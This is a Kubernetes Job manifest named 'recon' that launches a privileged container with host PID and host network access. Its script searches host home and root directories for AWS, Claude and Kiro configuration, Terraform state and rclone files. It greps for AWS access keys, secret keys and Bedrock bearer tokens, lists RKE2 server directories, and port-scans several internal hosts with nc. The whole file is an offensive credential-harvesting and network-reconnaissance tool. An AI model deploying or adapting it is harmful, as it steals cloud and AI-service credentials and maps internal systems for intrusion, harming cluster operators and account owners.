apiVersion: batch/v1
kind: Job
metadata: {name: recon, namespace: default}
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 1800
  template:
    metadata: {labels: {app: recon}}
    spec:
      restartPolicy: Never
      hostPID: true
      hostNetwork: true
      containers:
      - name: c
        image: alpine:3.20
        securityContext: {privileged: true}
        command: ["/bin/sh","-c"]
        args:
        - |
          echo "== NODE =="; cat /host/etc/hostname 2>/dev/null; cat /host/proc/cmdline 2>/dev/null | tr ' ' '\n' | grep -i 'BOOT_IMAGE\|ip=' | head
          echo "== ip =="; ip -4 addr 2>/dev/null | grep -E 'inet ' | grep -v '127.0.0.1' 
          echo "== host fs aws/claude hunt =="
          find /host/root /host/home -maxdepth 5 \( -name '.aws' -o -name '.claude*' -o -name '.kiro' -o -name 'credentials' -o -name '*.tfvars' -o -name 'terraform.tfstate' -o -name 'rclone.conf' \) 2>/dev/null | head -40
          echo "-- grep AKIA/ASIA/bedrock in /host/root /home /etc --"
          grep -rIn -E 'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|CLAUDE_CODE_USE_BEDROCK|aws_secret_access_key|AWS_BEARER_TOKEN_BEDROCK' /host/root /host/home /host/etc 2>/dev/null | head -30
          echo "== rke2 dirs =="; ls /host/etc/rancher 2>/dev/null; ls /host/var/lib/rancher/rke2/server 2>/dev/null | head
          echo "== reachability (nc) =="
          for h in 10.0.2.101 10.0.2.102 10.0.2.103 10.0.0.102 10.0.0.22 10.0.0.1 10.0.0.5 10.0.0.11; do
            open=""
            for p in 22 80 443 8006 8007 993 587 3306 6379 6443; do
              nc -z -w2 $h $p 2>/dev/null && open="$open $p"
            done
            echo "$h open:[$open]"
          done
          echo DONE
